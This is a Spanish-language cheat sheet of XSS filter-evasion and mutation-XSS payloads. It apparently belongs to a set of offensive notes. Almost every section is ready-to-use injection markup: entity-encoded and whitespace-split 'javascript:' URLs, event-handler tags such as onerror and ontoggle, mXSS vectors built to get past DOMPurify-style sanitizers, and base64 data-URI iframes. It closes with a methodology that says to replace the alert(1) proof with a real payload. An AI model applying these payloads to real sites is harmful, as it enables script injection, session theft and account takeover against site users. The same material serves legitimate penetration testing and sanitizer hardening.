# HTML - Ofuscación de tags/atributos y mXSS

Notas para cuando un sanitizador HTML bloquea tags, atributos o `javascript:`, o
cuando quieres que el **parser del navegador reescriba tu input** a algo peligroso
(mutation XSS). Complementa a [xss-obfuscation.md](xss-obfuscation.md) y
[js-obfuscation.md](js-obfuscation.md).

---

## 1. ENTIDADES HTML (el gran comodín)

El parser decodifica entidades **en el valor de los atributos** antes de usarlos.
Sirve para esconder `javascript:`, `:`, `(`, etc. en un `href`/`src`.

Formas equivalentes de un mismo carácter (ej. `:` = code point 58):
```
&colon;      (named)
&#58;        (decimal)
&#x3a;       (hex)
&#0000058;   (decimal con ceros a la izquierda, válido)
&#X3A;       (hex, X mayúscula válida)
```
Sin `;` final también cuela en muchos parsers: `&#58`.

Ejemplo — ocultar `javascript:`:
```html
<a href="javascript:alert(1)">x</a>
<a href="&#106;avascript&#58;alert(1)">x</a>
<a href="javasc&#x09;ript:alert(1)">x</a>   <!-- tab en medio -->
```
Se pueden intercalar `\t \n \r` (`&#9; &#10; &#13;`) dentro de `javascript:` y
el navegador los ignora al resolver el esquema.

---

## 2. Caso / mayúsculas y espacios raros

Filtros que buscan strings exactos caen con:
```html
<ScRiPt>alert(1)</sCrIpT>
<img SRC=x OnErRoR=alert(1)>
<img/src=x/onerror=alert(1)>          <!-- / como separador en vez de espacio -->
<img src=x onerror=alert(1)//>
<svg onload=alert(1) >
```
Separadores válidos entre atributos: espacio, `\t`(`&#9;`), `\n`(`&#10;`),
`\r`(`&#13;`), `\f`(`&#12;`), `/`.

---

## 3. Tags y atributos alternativos (si bloquean `<script>`)

Cuando `<script>` está prohibido, hay muchos vectores que ejecutan solos:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<a href=javascript:alert(1)>click</a>
```

---

## 4. mXSS (Mutation XSS)

El sanitizador ve un input **inocuo**; al insertarlo en el DOM (`innerHTML`) el
navegador lo **re-parsea/normaliza** y muta a algo ejecutable. Clásico con
contextos donde el parser "arregla" el markup:

```html
<!-- Dentro de contextos como <svg>, <math>, <noscript>, comillas backtick, etc.
     el navegador reinterpreta al serializar/reparsear -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```
La idea: aprovechar diferencias entre cómo **sanea** la librería (un parser) y
cómo **renderiza** el navegador (otro parser). DOMPurify y similares han tenido
varios bypasses históricos por esto.

---

## 5. Ofuscar `javascript:` en `href`/`src`

Combina entidades + whitespace + case:
```html
<a href="jAvAsCrIpT:alert(1)">x</a>
<a href="  javascript:alert(1)">x</a>        <!-- espacios delante -->
<a href="java&#09;script:alert(1)">x</a>
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;alert(1)">x</a>
```

---

## 6. Data URIs (ejecución en contextos que las cargan)

```html
<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
<object data="data:text/html,<script>alert(1)</script>"></object>
```
Base64 del contenido:
```javascript
btoa('<script>alert(1)</script>')   // PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## 7. Metodología

1. **Mira dónde cae tu input**: ¿texto, atributo, `href`, dentro de `<script>`?
   Eso decide qué ofuscación aplica.
2. **Prueba vectores que no usan `<script>`** (`onerror`, `onload`, `autofocus`).
3. Si filtran `javascript:` -> **entidades + whitespace + case** (secciones 1 y 5).
4. Si es un sanitizador tipo DOMPurify -> piensa en **mXSS** (sección 4) y en la
   versión concreta de la librería.
5. Confirma con `alert(1)` y luego cambia al payload real
   (ver [js-obfuscation.md](js-obfuscation.md) sección 5).
